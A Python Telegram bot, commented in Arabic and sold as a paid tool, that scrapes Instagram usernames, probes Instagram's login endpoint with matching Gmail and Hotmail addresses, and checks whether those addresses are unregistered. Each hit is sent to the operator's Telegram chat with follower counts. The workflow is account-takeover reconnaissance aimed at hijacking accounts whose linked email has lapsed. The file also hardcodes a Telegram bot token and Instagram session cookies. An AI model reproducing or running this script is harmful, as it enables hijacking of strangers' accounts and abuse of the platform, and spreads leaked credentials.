try:
    import requests
    import telebot ,re
    from TSMRS import check 
    from user_agent import generate_user_agent
except:
    from os import system as general
    general("pip install requests")
    general("pip install telebot")
    general("pip install user_agent")
tok ='5815425184:AAGkLYBDkexTX7jeZH_C-UssTugsl7pgQvc'
bot = telebot.TeleBot(tok)
ch=check()

id = 5645385208
users=[]
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id == id:
        bot.send_message(id,text ="اهلا بك في بوت صيد متاحات انستكرام \n لسحب يوزرات من البحث ارسل \n /search مع كلمت البحث كمثال \n /search iran \n للفحص ارسل /run")

    else:
        bot.send_message(message.chat.id,text="عذرا البوت مدفوع وليس مجاني لشراء نسخه او عمل بوت بحقوقك يرجو مراسله المطور \n@Hu2_c")



@bot.message_handler(commands=['search'])

def search(message):
    if message.chat.id == id:
        bot.send_message(id,text="جار سحب يوزرات يرجوو الانتضار ")
        name = message.text.split(' ')[1]
        url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={name}&rank_token=0.11692785907284398&include_reel=true'
        hed={
'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 'yiUxqBBIOrnaci9tJVhsCwb7V8lpIEAf',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV1KK',
'X-Requested-With': 'XMLHttpRequest',
'Alt-Used': 'www.instagram.com',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; sessionid=239168116%3ABL8M3wn09U7Hkt%3A19%3AAYdeZi65U1Xm1q_KqQ1Tq2EE6EJwqvEHvgMSK-7OMA; ds_user_id=239168116; csrftoken=yiUxqBBIOrnaci9tJVhsCwb7V8lpIEAf; rur="ODN\054239168116\0541704584084:01f72c27ead73bdf300a863482b3ba5b55177fef546338f123a82ea2cd9ca1297177d8e7"; fbsr_124024574287414=asT0R7Uq_rWBDw4DGXQkfiTNZKY3fV9_xdYeUUJ7cT4.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQTB3YUI3cGV0bmg2cmNBLS1IcUQ5am16WkM0ZzZZMWN4V0lMcmU0OVU5eFY2WDlxTDlaQm1Idjk5OXVUdnJVakN1bnZCS3htbU5IaUJHeGU5bDFsQWZFbFFUZ2R0YTRzMlZoRVpNMHRNWHRfMlo3TThRMGQ2UTRuSXZNcGhQU3VpRmJTWkJaYWF5WTNaYU96S1JVcER2WjE3T1dzV2xCeG91bTY0Q3kyMUl0OGNBVldwLXNJdHVnLUY4U2R0Z1lfUjNyR0FNTG5YYWlkeE5JcDdWMm55bnVzN213NGVNdGx0dGliUUV2X3F3YkR4a2NHM2J2VVRnS0NPRmw2dkk4cDBvOEJoM1NNSmVuTzAtUl9HdC1zYkloMGhKNFdtdl94Sm1FZzMzbzF3NzZiTHBqZDQyN2JpM2RPTVAwcXRmSXduMl9iRkllSEVvaFVJSmpkZUlnNTZnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUFzcTM5bjR2ZkZXZlAwbzIwMlB1ekZFem0xY3hPSWVUc0FjcXdoMWJkVEdJTjREbEl2dUg1ZTliNWNaQnFwOXFQSzNoWVpBVm1KeFZHYWp6NDRVYk8yc2t6amtwMTZjSTltd2tHZklEQVpCNUFkcU9oNW9sQWpOTU9EZWVXQ1lsdHpzZTlsZDBHUDhocUtOSVlUN1VVNTBBR1RldGh1aTJ1N3ZFM2pFdGlnOWYxZnBMVVpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMwNDgwNzR9',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
        
        reqemail=requests.get(url,headers=hed).json()['users']
        for i in reqemail:
            i=i['user']['username']
            users.append(i)
                      
        bot.send_message(id,text="اكتمل السحب ")



    else:
        bot.send_message(message.chat.id,text="عذرا البوت مدفوع وليس مجاني لشراء نسخه او عمل بوت بحقوقك يرجو مراسله المطور \n@Hu2_c")

'''
@bot.message_handler(commands=['hash'])

def hash(message):
	if message.chat.id == id:
		bot.send_message(id,text="جار سحب يوزرات يرجوو الانتضار ")
		name=message.text.split(' ')[1]
		url =f"https://i.instagram.com/api/v1/tags/web_info/?tag_name={name}"
		hed={'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 'VAgoPf8YkVFcto37pc0TZjR280yWJNDj',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRVzv0',
'X-Requested-With': 'XMLHttpRequest',
'Alt-Used': 'www.instagram.com',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/explore/tags/ir%C3%A1n/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541705311570:01f755013eae2a7a3ac3ed2e66272e7d7e7a96ca18a68b63680f704f4bebdc57ab63ebb9"; shbts="1673775570\054239168116\0541705311570:01f73abd9e6086d09613371a6cff527e1807bdb16acdf1248a9b1aec8192ea7dde80a2f7"; ig_direct_region_hint="ODN\054239168116\0541704725792:01f769aad381fb6430dc81daa815af3979cca2a48dc6ca67ea389d1f980d8c4d31a6fa10"; rur="RVA\05450732239062\0541705316283:01f70522ca811270f31609ba40eca73c49939b1510ce6bf1fa57077fd861553ac613d8df"; csrftoken=BNyjFU0E84I0e5yAluv908vj4gektBCk; ds_user_id=50732239062; sessionid=50732239062%3A5gGYus8sEnWBlA%3A15%3AAYeZzb2SOGPqMLKU5Pna95jzcQr3Ka_bmRiewcD6GA',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}


		i=requests.get(url,headers=hed).json()['data']['top']['sections']
		for i in i:
			i=i['layout_content']['medias']
			for i in i:
				i=(i['media']['comments'])
				for i in i:
					i=str(i['user']['username'])
					open('user.txt','a').write(f'{i}\n')
		bot.send_message(message.chat.id,text='اكتمل السحب ')
	else:
		bot.send_message(message.chat.id,text="عذرا البوت مدفوع وليس مجاني لشراء نسخه او عمل بوت بحقوقك يرجو مراسله المطور \n@Hu2_c")
'''



@bot.message_handler(commands=['run'])

def run(message):
	if message.chat.id == id:
		if users == []:
			bot.send_message(id,text=" يرجو سحب يورزات اولا ")
		else:
			bot.send_message(id,text="جار فحص يرجو الانتضار ")
			for user in users:
				url='https://www.instagram.com/api/v1/web/accounts/login/ajax/ '
				hed ={'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 'BNyjFU0E84I0e5yAluv908vj4gektBCk',
'X-Instagram-AJAX': '1006821120',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3SDA8BLoXS5StL0vf69WtlaiuJkLZDXVE_LwP_i0XLH_SK',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Requested-With': 'XMLHttpRequest',
'Content-Length': '399',
'Origin': 'https://www.instagram.com',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/accounts/login/?__coig_restricted=1',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541705311570:01f755013eae2a7a3ac3ed2e66272e7d7e7a96ca18a68b63680f704f4bebdc57ab63ebb9"; shbts="1673775570\054239168116\0541705311570:01f73abd9e6086d09613371a6cff527e1807bdb16acdf1248a9b1aec8192ea7dde80a2f7"; csrftoken=BNyjFU0E84I0e5yAluv908vj4gektBCk; ds_user_id=50732239062; rur="RVA\05450732239062\0541705351756:01f7d3a9d567fbff7be1329bf633213a5847a713de882732c0b625562575b767b12b39bb"',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
				data={'nc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:Kohusinko1','username':f"{user}@gmail.com"}
	
				req=requests.post(url=url,headers=hed,data=data).json()
				if "user" in req:
					c=ch.Gmail(f"{user}@gmail.com")
					if c=='200':
						print(f'No acount {user}@gmail.com')
					else:
						urlname=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'
						hedname={'Host': 'www.instagram.com',
	        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
	        'Accept': '*/*',
	        'Accept-Language': 'en-US,en;q=0.5',
	        'Accept-Encoding': 'gzip, deflate, br',
	        'X-CSRFToken': 's0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H',
	        'X-IG-App-ID': '936619743392459',
	        'X-ASBD-ID': '198387',
	        'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV0Us',
	        'X-Requested-With': 'XMLHttpRequest',
	        'Connection': 'keep-alive',
	        'Referer': 'https://www.instagram.com/h____sm/',
	        'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; csrftoken=s0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H; ds_user_id=239168116; sessionid=239168116%3AcuIhdqhVhnVTRC%3A22%3AAYeLym8Ffmk6k6IzWERD1rKC8k-fMeDUQt7N1Ue0FQ; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9; rur="ODN\054239168116\0541704659746:01f704a47b19db4f6096090c96ebc163e18daa688efd12dfcb1fdd24db444fa174c44950"; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9',
	        'Sec-Fetch-Dest': 'empty',
	        'Sec-Fetch-Mode': 'cors',
	        'Sec-Fetch-Site': 'same-origin'}
						i=requests.get(url=urlname,headers=hedname).json()
						follow=i['data']['user']['edge_follow']['count']
						followers=i['data']['user']['edge_followed_by']['count']
						name = i['data']['user']['full_name']
	                #business=i['data']['user']['business_email']
	
						kkoo=f'''name:{name}\nfollowers:{followers}\nfollowing:{follow}'''
						print (f'YES email True {user}@gmail.com')
						requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text=user :: {user} \nemail : {user}@gmail.com\n{kkoo}")
	
				else:
					data={'nc_password':'Kohusinko1','username':f'{user}@hotmail.com'}
					req=requests.post(url=url,headers=hed,data=data).json()
					if "user" in req:
						c=ch.Hotmail(f"{user}@hotmail.com")
						if c=='200':
							print(f'No acount {user}@hotmail.com')
							
						else:
							urlname=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'
							hedname={'Host': 'www.instagram.com',
	        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
	        'Accept': '*/*',
	        'Accept-Language': 'en-US,en;q=0.5',
	        'Accept-Encoding': 'gzip, deflate, br',
	        'X-CSRFToken': 's0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H',
	        'X-IG-App-ID': '936619743392459',
	        'X-ASBD-ID': '198387',
	        'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV0Us',
	        'X-Requested-With': 'XMLHttpRequest',
	        'Connection': 'keep-alive',
	        'Referer': 'https://www.instagram.com/h____sm/',
	        'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; csrftoken=s0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H; ds_user_id=239168116; sessionid=239168116%3AcuIhdqhVhnVTRC%3A22%3AAYeLym8Ffmk6k6IzWERD1rKC8k-fMeDUQt7N1Ue0FQ; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9; rur="ODN\054239168116\0541704659746:01f704a47b19db4f6096090c96ebc163e18daa688efd12dfcb1fdd24db444fa174c44950"; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9',
	        'Sec-Fetch-Dest': 'empty',
	        'Sec-Fetch-Mode': 'cors',
	        'Sec-Fetch-Site': 'same-origin'}
							i=requests.get(url=urlname,headers=hedname).json()
							follow=i['data']['user']['edge_follow']['count']
							followers=i['data']['user']['edge_followed_by']['count']
							name = i['data']['user']['full_name']
	                                #business=i['data']['user']['business_email']
	
							kkoo=f'''name:{name}\nfollowers:{followers}\nfollowing:{follow}'''
							print (f'YES email True {user}@Hotmail.com')
							requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text=user : {user}\nemail : {user}@hotmail.com\n{kkoo}")
					else:
					    print (f"No account :: {user}")
			
			bot.send_message(id,text="اكتمل الفحص ")
			users.clear()
		
	else:
		bot.send_message(message.chat.id,text="عذرا البوت مدفوع وليس مجاني لشراء نسخه او عمل بوت بحقوقك يرجو مراسله المطور \n@Hu2_c")

bot.polling()